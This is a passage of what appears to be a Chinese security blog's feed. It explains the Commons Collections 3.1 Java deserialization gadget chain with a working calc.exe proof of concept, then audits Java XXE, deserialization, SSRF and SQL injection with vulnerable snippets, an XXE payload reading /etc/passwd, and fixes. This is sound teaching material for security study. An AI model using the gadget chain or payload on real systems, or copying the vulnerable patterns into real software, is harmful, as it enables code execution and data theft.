class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">            <span class="keyword">new</span> ConstantTransformer(Runtime<span class="class">.<span class="keyword">class</span>),</span></span><br><span class="line">            new InvokerTransformer("getMethod", new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;"getRuntime", new Class[0]&#125;),</span><br><span class="line">            new InvokerTransformer("invoke", new Class[] &#123; Object.class, Object[].class &#125;, new Object[]&#123;null,new Object[0]&#125;),</span><br><span class="line">            new InvokerTransformer("exec", new Class[] &#123; String.class&#125;, new Object[]&#123;"calc.exe"&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        Transformer transformeredChain = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line">        <span class="comment">// 构成调用链：((Runtime)Runtime.class.getMethod("getRuntime",null).invoke(null,null).exec("calc.exe"));</span></span><br><span class="line">        Map normalMap = <span class="keyword">new</span> HashMap();</span><br><span class="line">        normalMap.put(<span class="string">"value"</span>,<span class="string">"value"</span>);</span><br><span class="line">        Map transformedMap = TransformedMap.decorate(normalMap,<span class="keyword">null</span>,transformeredChain);</span><br><span class="line">        Map.Entry entry =(Map.Entry)transformedMap.entrySet().iterator().next();</span><br><span class="line">        entry.setValue(<span class="string">"test"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>执行这段代码就会成功弹出计算器：</p><p><img src="/2020/07/19/CommonsCollections3%E5%88%A9%E7%94%A8%E9%93%BE/3.png" alt></p><h2 id="0x01-CommonsCollections调用链关键点"><a href="#0x01-CommonsCollections调用链关键点" class="headerlink" title="0x01 CommonsCollections调用链关键点"></a>0x01 CommonsCollections调用链关键点</h2><h3 id="Apache-CommonsCollections"><a href="#Apache-CommonsCollections" class="headerlink" title="Apache CommonsCollections"></a>Apache CommonsCollections</h3><p>Apache Commons Collections是一个扩展了Java标准库里的Collection结构的<strong>第三方基础库</strong>，它提供了很多强有力的数据结构类型并且实现了各种集合工具类。作为Apache开源项目的重要组件，Commons Collections被广泛应用于各种Java应用的开发。</p><h3 id="TransformedMap类"><a href="#TransformedMap类" class="headerlink" title="TransformedMap类"></a>TransformedMap类</h3><p><strong>TransformedMap类</strong>是Apache CommonsCollections 组件中的一个<strong>实现类</strong>。TransformedMap是对Java标准数据结构Map接口的一个扩展。该类可以在一个元素被加入到集合内时，自动对该元素进行特定的修饰变换，具体的变换逻辑由<strong>Transformer类</strong>定义，Transformer在TransformedMap实例化时作为参数传入。</p><p>我们可以通过TransformedMap.decorate()方法，获得一个TransformedMap的实例：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Map transformedMap = TransformedMap.decorate(map,keyTransformer,valueTransformer);</span><br></pre></td></tr></table></figure><p>当<strong>TransformedMap内的key 或者 value发生变化时，就会触发相应的Transformer的transform()方法</strong>。另外，还可以使用Transformer数组构造成ChainedTransformer。当触发时，<strong>ChainedTransformer可以按顺序调用一系列的变换</strong>。</p><blockquote><p>第一句解释了代码执行的触发点：TransformedMap的键值对中的值发生改变时就会触发Transformer类中的transform方法中的代码。</p><p>第二据解释了代码调用链的构造：Transformer数组能构成一条链ChainedTransformer，上面代码触发时会链式地调用ChainedTransformer中的方法。</p></blockquote><p>关于上面这两点为何要这么选择？这个链接进行了很好的解释：<a href="https://blog.0kami.cn/2019/10/24/study-java-deserialized-commonscollections3-1/" target="_blank" rel="noopener">https://blog.0kami.cn/2019/10/24/study-java-deserialized-commonscollections3-1/</a></p><h3 id="InvokerTransformer类"><a href="#InvokerTransformer类" class="headerlink" title="InvokerTransformer类"></a>InvokerTransformer类</h3><p>先贴上InvokerTransformer类的构造函数的定义和它的transform方法的定义：</p><p><img src="/2020/07/19/CommonsCollections3%E5%88%A9%E7%94%A8%E9%93%BE/4.png" alt></p><p>我把需要分析的完整（省略了一部分方法）的代码放在下面，注意注释：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">package org.apache.commons.collections.functors;</span><br><span class="line"></span><br><span class="line">import java.io.Serializable;</span><br><span class="line">import java.lang.reflect.InvocationTargetException;</span><br><span class="line">import java.lang.reflect.Method;</span><br><span class="line">import org.apache.commons.collections.FunctorException;</span><br><span class="line">import org.apache.commons.collections.Transformer;</span><br><span class="line"></span><br><span class="line">public class InvokerTransformer implements Transformer, Serializable &#123;</span><br><span class="line">    static final long serialVersionUID = -8653385846894047688L;</span><br><span class="line">    private final String iMethodName;</span><br><span class="line">    private final Class[] iParamTypes;</span><br><span class="line">    private final Object[] iArgs;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">// InvokerTransformer的构造方法，可以看到三个用来作为反射参数的成员变量（iMethodName、iParamTypes、iArgs）都是通过构造函数直接赋值的，并未作过滤。</span><br><span class="line">    public InvokerTransformer(String methodName, Class[] paramTypes, Object[] args) &#123;</span><br><span class="line">        this.iMethodName = methodName;</span><br><span class="line">        this.iParamTypes = paramTypes;</span><br><span class="line">        this.iArgs = args;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public Object transform(Object input) &#123;</span><br><span class="line">        if (input == null) &#123;</span><br><span class="line">            return null;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            try &#123;</span><br><span class="line">                Class cls = input.getClass();</span><br><span class="line">                // 调用链触发后会执行transform方法，核心就是这里的利用反射特性去调用iMethodName、iParamTypes和iArgs所指的类的方法</span><br><span class="line">                Method method = cls.getMethod(this.iMethodName, this.iParamTypes);</span><br><span class="line">                return method.invoke(input, this.iArgs);</span><br><span class="line">            &#125; catch (NoSuchMethodException var5) &#123;</span><br><span class="line">                throw new FunctorException(&quot;InvokerTransformer: The method &apos;&quot; + this.iMethodName + &quot;&apos; on &apos;&quot; + input.getClass() + &quot;&apos; does not exist&quot;);</span><br><span class="line">            &#125; catch (IllegalAccessException var6) &#123;</span><br><span class="line">                throw new FunctorException(&quot;InvokerTransformer: The method &apos;&quot; + this.iMethodName + &quot;&apos; on &apos;&quot; + input.getClass() + &quot;&apos; cannot be accessed&quot;);</span><br><span class="line">            &#125; catch (InvocationTargetException var7) &#123;</span><br><span class="line">                throw new FunctorException(&quot;InvokerTransformer: The method &apos;&quot; + this.iMethodName + &quot;&apos; on &apos;&quot; + input.getClass() + &quot;&apos; threw an exception&quot;, var7);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>Java反射特性相关的函数：getClass、getMethod、invoke</p><p>getClass：public final Class getClass()，它返回对对象的Class对象的引用。</p><p>getMethod：Method Class.getMethod(String name, Class&lt;?&gt;… parameterTypes)的作用是获得对象所声明的公开方法。getMethod的第一个参数name是要获得方法的名字，第二个参数parameterTypes是按声明顺序标识该方法形参类型。</p><p>invoke：Method类的invoke(Object obj,Object args[])方法接收的参数必须为对象，返回值总是对象。用来执行某个的对象的目标方法。</p></blockquote><h3 id="ChainedTransformer类"><a href="#ChainedTransformer类" class="headerlink" title="ChainedTransformer类"></a>ChainedTransformer类</h3><p>由于完成Runtime.getRuntime().exec()的动作需要多次调用transform函数（先调用Runtime.getRuntime再调用Runtime.exec），所以还得找一个能多次调用transform的地方。这时候就需要用到ChainedTransformer进行调用类的串联了（即是上面ChainedTransformer可以按顺序调用一系列的变换的原因）：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">private final Transformer[] iTransformers;// 填充构造后的实例</span><br><span class="line"></span><br><span class="line">public Object transform(Object object) &#123;</span><br><span class="line">    for (int i = 0; i &lt; iTransformers.length; i++) &#123;</span><br><span class="line">        object = iTransformers[i].transform(object);// 调用链，</span><br><span class="line">    &#125;</span><br><span class="line">    return object;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="0x02-CommonsCollections调用链过程"><a href="#0x02-CommonsCollections调用链过程" class="headerlink" title="0x02 CommonsCollections调用链过程"></a>0x02 CommonsCollections调用链过程</h2><p>如果上面的CommonsCollections中的关键点弄清的话，现在就来解释调用链执行弹出计算器的过程。首先解释代码的第一部分：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] transformers = new Transformer[]&#123;</span><br><span class="line">            new ConstantTransformer(Runtime.class),</span><br><span class="line">            new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, new Class[0]&#125;),</span><br><span class="line">            new InvokerTransformer(&quot;invoke&quot;, new Class[] &#123; Object.class, Object[].class &#125;, new Object[]&#123;null,new Object[0]&#125;),</span><br><span class="line">            new InvokerTransformer(&quot;exec&quot;, new Class[] &#123; String.class&#125;, new Object[]&#123;&quot;calc.exe&quot;&#125;)</span><br></pre></td></tr></table></figure><p>这部分的代码其实就只是构建了一个Transformer类的数组，在transformers数组中定义了四个元素：一个ConstantTransformer对象和三个InvokerTransformer对象。这时候我们复习上面提及的InvokerTransformer类的构造方法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">public InvokerTransformer(String methodName, Class[] paramTypes, Object[] args) &#123;</span><br><span class="line">this.iMethodName = methodName;</span><br><span class="line">this.iParamTypes = paramTypes;</span><br><span class="line">this.iArgs = args;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>所以数组中三个的InvokerTransformer元素，会把其参数列表中的参数依次根据其构造方法赋值给其内部的iMethodName、iParamTypes、iArgs成员变量。</p><blockquote><p>例如第一个InvokerTransformer元素的参数是：”getMethod”, new Class[]{String.class, Class[].class}, new Object[]{“getRuntime”, new Class[0]}），一共三个参数。所以会调用InvokerTransformer类中具有三个参数的构造方法。然后将”getMethod”赋值给iMethodName、将new Class[]{String.class, Class[].class}赋值给iParamTypes、将new Object[]{“getRuntime”, new Class[0]}）赋值给iArgs。</p></blockquote><p>而这三个成员变量恰恰是transform中动态调用的重要依据。</p><p>然后我们分析第二部分代码，第一步的目的也很清晰，就是用transformers数组来实例化成一个ChainedTransformer：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Transformer transformeredChain = new ChainedTransformer(transformers);</span><br><span class="line">        // 构成调用链：((Runtime)Runtime.class.getMethod(&quot;getRuntime&quot;,null).invoke(null,null).exec(&quot;calc.exe&quot;));</span><br><span class="line">        Map normalMap = new HashMap();</span><br><span class="line">        normalMap.put(&quot;value&quot;,&quot;value&quot;);</span><br><span class="line">        Map transformedMap = TransformedMap.decorate(normalMap,null,transformeredChain);</span><br><span class="line">        Map.Entry entry =(Map.Entry)transformedMap.entrySet().iterator().next();</span><br><span class="line">        entry.setValue(&quot;test&quot;);</span><br></pre></td></tr></table></figure><p>虽然构建一个HashMap类，随便给他设置了一个键值对value-value。</p><blockquote><p>这里写Java的朋友说HashMap其实可以简单理解成python里面的字典。</p></blockquote><p>然后代码通过TransformedMap.decorate()方法，获得一个TransformedMap。随后我们通过entry来遍历整个HashMap获取里面的元素。然后我们只要把其中一个键值对改变，就会像第二篇章说的一样：触发transformeredChain（即transformers数组）中每个元素的transform方法，从而利用transform中的反射获取需要的类方法并因为transformeredChain的多次调用而构成一整条调用链：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">((Runtime)Runtime.class.getMethod(&quot;getRuntime&quot;,null).invoke(null,null).exec(&quot;calc.exe&quot;));</span><br></pre></td></tr></table></figure><blockquote><p>调用：使用了反射特性；链：根据transformeredChain中的多次调用形成调用链；触发点：TransformedMap中的键值对被改变。</p></blockquote><p>我们可以做个简单实验，只要注释掉重新赋值value的语句entry.setValue(“test”)，代码并不触发：</p><p><img src="/2020/07/19/CommonsCollections3%E5%88%A9%E7%94%A8%E9%93%BE/6.png" alt></p><p>去掉注释就会触发调用链重新打开计算器了：</p><p><img src="/2020/07/19/CommonsCollections3%E5%88%A9%E7%94%A8%E9%93%BE/7.png" alt></p><h2 id="0x03-小结"><a href="#0x03-小结" class="headerlink" title="0x03 小结"></a>0x03 小结</h2><p>这里只是梳理了Commons Collections3这条链的前因后果，因为写的头昏眼花啦，这篇等我后面再补齐剩余的内同。然后就是找到Java触发反序列化的点简单，关键是如何<strong>找到可利用的调用链</strong>。这个作为最经典的一条调用链，我就先说到这里了。下次继续补齐并写其他调用链。</p><p>参考链接:</p><p> <a href="https://security.tencent.com/index.php/blog/msg/97" target="_blank" rel="noopener">https://security.tencent.com/index.php/blog/msg/97</a> </p><p> <a href="https://blog.0kami.cn/2019/10/24/study-java-deserialized-commonscollections3-1/" target="_blank" rel="noopener">https://blog.0kami.cn/2019/10/24/study-java-deserialized-commonscollections3-1/</a> </p><p> <a href="https://www.cnblogs.com/GISQZC/p/5809019.html" target="_blank" rel="noopener">https://www.cnblogs.com/GISQZC/p/5809019.html</a> </p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;CommonsCollections3利用链&quot;&gt;&lt;a href=&quot;#CommonsCollections3利用链&quot; class=&quot;headerlink&quot; title=&quot;CommonsCollections3利用链&quot;&gt;&lt;/a&gt;CommonsCollections3利
      
    
    </summary>
    
    
      <category term="WEB安全" scheme="http://bai-ren-1.github.io/categories/WEB%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>Java敏感函数</title>
    <link href="http://bai-ren-1.github.io/2020/07/16/Java%E6%95%8F%E6%84%9F%E5%87%BD%E6%95%B0/"/>
    <id>http://bai-ren-1.github.io/2020/07/16/Java%E6%95%8F%E6%84%9F%E5%87%BD%E6%95%B0/</id>
    <published>2020-07-16T13:31:34.000Z</published>
    <updated>2020-09-18T05:20:39.282Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Java敏感函数"><a href="#Java敏感函数" class="headerlink" title="Java敏感函数"></a>Java敏感函数</h1><p>因为最近开发插件见到了很多敏感函数，记录记录。</p><h2 id="0x00-XXE"><a href="#0x00-XXE" class="headerlink" title="0x00 XXE"></a>0x00 XXE</h2><h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><p>XML文档结构包括XML声明、DTD文档类型定义（可选）、文档元素。文档类型定义(DTD)的作用是定义 XML 文档的合法构建模块。DTD 可以在 XML 文档内声明，也可以外部引用。</p><ul><li>内部声明DTD:</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE 根元素 [元素声明]&gt;</span><br></pre></td></tr></table></figure><ul><li>引用外部DTD:</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE 根元素 SYSTEM &quot;文件名&quot;&gt;</span><br></pre></td></tr></table></figure><p>当允许引用外部实体时，恶意攻击者即可构造恶意内容访问服务器资源,如读取passwd文件：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE replace [</span></span><br><span class="line"><span class="meta">&lt;!ENTITY test SYSTEM "file:///ect/passwd"&gt;]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">msg</span>&gt;</span>&amp;test;<span class="tag">&lt;/<span class="name">msg</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="漏洞示例"><a href="#漏洞示例" class="headerlink" title="漏洞示例"></a>漏洞示例</h3><p>此处以org.dom4j.io.SAXReader为例，仅展示部分代码片段：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">String xmldata = request.getParameter(<span class="string">"data"</span>);</span><br><span class="line">SAXReader sax = <span class="keyword">new</span> SAXReader();</span><br><span class="line"><span class="comment">// 创建一个SAXReader对象</span></span><br><span class="line">Document document = sax.read(<span class="keyword">new</span> ByteArrayInputStream(xmldata.getBytes()));</span><br><span class="line"><span class="comment">// 获取document对象,如果文档无节点，则会抛出Exception提前结束</span></span><br><span class="line">Element root = document.getRootElement(); <span class="comment">//获取根节点</span></span><br><span class="line">List rowList = root.selectNodes(<span class="string">"//msg"</span>);</span><br><span class="line">Iterator&lt;?&gt; iter1 = rowList.iterator();</span><br><span class="line"><span class="keyword">if</span> (iter1.hasNext()) &#123;</span><br><span class="line">    Element beanNode = (Element) iter1.next();</span><br><span class="line">    modelMap.put(<span class="string">"success"</span>,<span class="keyword">true</span>);</span><br><span class="line">    modelMap.put(<span class="string">"resp"</span>,beanNode.getTextTrim());</span><br><span class="line">&#125;</span><br><span class="line">...</span><br></pre></td></tr></table></figure><h3 id="审计函数"><a href="#审计函数" class="headerlink" title="审计函数"></a>审计函数</h3><p>XML解析一般在导入配置、数据传输接口等场景可能会用到，涉及到XML文件处理的场景可留意下XML解析器是否禁用外部实体，从而判断是否存在XXE。部分XML解析接口如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">javax.xml.parsers.DocumentBuilder</span><br><span class="line">javax.xml.stream.XMLStreamReader</span><br><span class="line">org.jdom.input.SAXBuilder</span><br><span class="line">org.jdom2.input.SAXBuilder</span><br><span class="line">javax.xml.parsers.SAXParser</span><br><span class="line">org.dom4j.io.SAXReader </span><br><span class="line">org.xml.sax.XMLReader</span><br><span class="line">javax.xml.transform.sax.SAXSource </span><br><span class="line">javax.xml.transform.TransformerFactory </span><br><span class="line">javax.xml.transform.sax.SAXTransformerFactory </span><br><span class="line">javax.xml.validation.SchemaFactory</span><br><span class="line">javax.xml.bind.Unmarshaller</span><br><span class="line">javax.xml.xpath.XPathExpression</span><br><span class="line">...</span><br></pre></td></tr></table></figure><h3 id="修复方案"><a href="#修复方案" class="headerlink" title="修复方案"></a>修复方案</h3><p>使用XML解析器时需要设置其属性，禁止使用外部实体，以上例中SAXReader为例，安全的使用方式如下:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sax.setFeature(<span class="string">"http://apache.org/xml/features/disallow-doctype-decl"</span>, <span class="keyword">true</span>);</span><br><span class="line">sax.setFeature(<span class="string">"http://xml.org/sax/features/external-general-entities"</span>, <span class="keyword">false</span>);</span><br><span class="line">sax.setFeature(<span class="string">"http://xml.org/sax/features/external-parameter-entities"</span>, <span class="keyword">false</span>);</span><br></pre></td></tr></table></figure><p>其它XML解析器的安全使用可参考<a href="https://www.owasp.org/index.php/XML_External_Entity_%28XXE%29_Prevention_Cheat_Sheet#Java" target="_blank" rel="noopener">OWASP XML External Entity (XXE) Prevention Cheat Sheet</a></p><h2 id="0x01-反序列化漏洞"><a href="#0x01-反序列化漏洞" class="headerlink" title="0x01 反序列化漏洞"></a>0x01 反序列化漏洞</h2><h3 id="介绍-1"><a href="#介绍-1" class="headerlink" title="介绍"></a>介绍</h3><p>序列化是让 Java 对象脱离 Java 运行环境的一种手段，可以有效的实现多平台之间的通信、对象持久化存储。 </p><p>Java程序使用ObjectInputStream对象的readObject方法将反序列化数据转换为java对象。但当输入的反序列化的数据可被用户控制，那么攻击者即可通过构造恶意输入，让反序列化产生非预期的对象，在此过程中执行构造的任意代码。</p><h3 id="漏洞示例-1"><a href="#漏洞示例-1" class="headerlink" title="漏洞示例"></a>漏洞示例</h3><p>漏洞代码示例如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">......</span><br><span class="line"><span class="comment">//读取输入流,并转换对象</span></span><br><span class="line">InputStream in=request.getInputStream();</span><br><span class="line">ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(in);</span><br><span class="line"><span class="comment">//恢复对象</span></span><br><span class="line">ois.readObject();</span><br><span class="line">ois.close();</span><br></pre></td></tr></table></figure><p>上述代码中，程序读取输入流并将其反序列化为对象。此时可查看项目工程中是否引入可利用的commons-collections 3.1、commons-fileupload 1.3.1等第三方库，即可构造特定反序列化对象实现任意代码执行。相关三方库及利用工具可参考ysoserial、marshalsec。</p><h3 id="审计函数-1"><a href="#审计函数-1" class="headerlink" title="审计函数"></a>审计函数</h3><p>反序列化操作一般在导入模版文件、网络通信、数据传输、日志格式化存储、对象数据落磁盘或DB存储等业务场景,在代码审计时可重点关注一些反序列化操作函数并判断输入是否可控，如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">ObjectInputStream.readObject</span><br><span class="line">ObjectInputStream.readUnshared</span><br><span class="line">XMLDecoder.readObject</span><br><span class="line">Yaml.load</span><br><span class="line">XStream.fromXML</span><br><span class="line">ObjectMapper.readValue</span><br><span class="line">JSON.parseObject</span><br><span class="line">...</span><br></pre></td></tr></table></figure><h3 id="修复方案-1"><a href="#修复方案-1" class="headerlink" title="修复方案"></a>修复方案</h3><p>如果可以明确反序列化对象类的则可在反序列化时设置白名单，对于一些只提供接口的库则可使用黑名单设置不允许被反序列化类或者提供设置白名单的接口，可通过Hook函数resolveClass来校验反序列化的类从而实现白名单校验，示例如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">AntObjectInputStream</span> <span class="keyword">extends</span> <span class="title">ObjectInputStream</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">AntObjectInputStream</span><span class="params">(InputStream inputStream)</span></span></span><br><span class="line"><span class="function">            <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>(inputStream);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 只允许反序列化SerialObject class</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> Class&lt;?&gt; resolveClass(ObjectStreamClass desc) <span class="keyword">throws</span> IOException,</span><br><span class="line">            ClassNotFoundException &#123;</span><br><span class="line">        <span class="keyword">if</span> (!desc.getName().equals(SerialObject<span class="class">.<span class="keyword">class</span>.<span class="title">getName</span>())) </span>&#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> InvalidClassException(</span><br><span class="line">                    <span class="string">"Unauthorized deserialization attempt"</span>,</span><br><span class="line">                    desc.getName());</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">super</span>.resolveClass(desc);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>也可以使用Apache Commons IO Serialization包中的ValidatingObjectInputStream类的accept方法来实现反序列化类白/黑名单控制，如果使用的是第三方库则升级到最新版本。更多修复方案可参考<a href="https://xianzhi.aliyun.com/forum/topic/41/" target="_blank" rel="noopener">浅谈Java反序列化漏洞修复方案</a>。</p><h2 id="0x02-SSRF"><a href="#0x02-SSRF" class="headerlink" title="0x02 SSRF"></a>0x02 SSRF</h2><h3 id="介绍-2"><a href="#介绍-2" class="headerlink" title="介绍"></a>介绍</h3><p>SSRF形成的原因大都是由于代码中提供了从其他服务器应用获取数据的功能但没有对目标地址做过滤与限制。比如从指定URL链接获取图片、下载等。</p><h3 id="漏洞示例-2"><a href="#漏洞示例-2" class="headerlink" title="漏洞示例"></a>漏洞示例</h3><p>此处以HttpURLConnection为例，示例代码片段如下:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">String url = request.getParameter(<span class="string">"picurl"</span>);</span><br><span class="line">StringBuffer response = <span class="keyword">new</span> StringBuffer();</span><br><span class="line"></span><br><span class="line">URL pic = <span class="keyword">new</span> URL(url);</span><br><span class="line">HttpURLConnection con = (HttpURLConnection) pic.openConnection();</span><br><span class="line">con.setRequestMethod(<span class="string">"GET"</span>);</span><br><span class="line">con.setRequestProperty(<span class="string">"User-Agent"</span>, <span class="string">"Mozilla/5.0"</span>);</span><br><span class="line">BufferedReader in = <span class="keyword">new</span> BufferedReader(<span class="keyword">new</span> InputStreamReader(con.getInputStream()));</span><br><span class="line">String inputLine;</span><br><span class="line"><span class="keyword">while</span> ((inputLine = in.readLine()) != <span class="keyword">null</span>) &#123;</span><br><span class="line">     response.append(inputLine);</span><br><span class="line">&#125;</span><br><span class="line">in.close();</span><br><span class="line">modelMap.put(<span class="string">"resp"</span>,response.toString());</span><br><span class="line"><span class="keyword">return</span> <span class="string">"getimg.htm"</span>;</span><br></pre></td></tr></table></figure><h3 id="审计函数-2"><a href="#审计函数-2" class="headerlink" title="审计函数"></a>审计函数</h3><p>程序中发起HTTP请求操作一般在获取远程图片、页面分享收藏等业务场景,在代码审计时可重点关注一些HTTP请求操作函数，如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">HttpClient.execute</span><br><span class="line">HttpClient.executeMethod</span><br><span class="line">HttpURLConnection.connect</span><br><span class="line">HttpURLConnection.getInputStream</span><br><span class="line">URL.openStream</span><br><span class="line">...</span><br></pre></td></tr></table></figure><h5 id="修复方案-2"><a href="#修复方案-2" class="headerlink" title="修复方案"></a>修复方案</h5><ul><li>使用白名单校验HTTP请求url地址</li><li>避免将请求响应及错误信息返回给用户</li><li>禁用不需要的协议及限制请求端口,仅仅允许http和https请求等</li></ul><h2 id="0x03-SQLi"><a href="#0x03-SQLi" class="headerlink" title="0x03 SQLi"></a>0x03 SQLi</h2><h3 id="介绍-3"><a href="#介绍-3" class="headerlink" title="介绍"></a>介绍</h3><p>注入攻击的本质，是程序把用户输入的数据当做代码执行。这里有两个关键条件，第一是用户能够控制输入；第二是用户输入的数据被拼接到要执行的代码中从而被执行。sql注入漏洞则是程序将用户输入数据拼接到了sql语句中，从而攻击者即可构造、改变sql语义从而进行攻击。</p><h3 id="漏洞示例-3"><a href="#漏洞示例-3" class="headerlink" title="漏洞示例"></a>漏洞示例</h3><p>此处以Mybatis框架为例，示例sql片段如下:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td 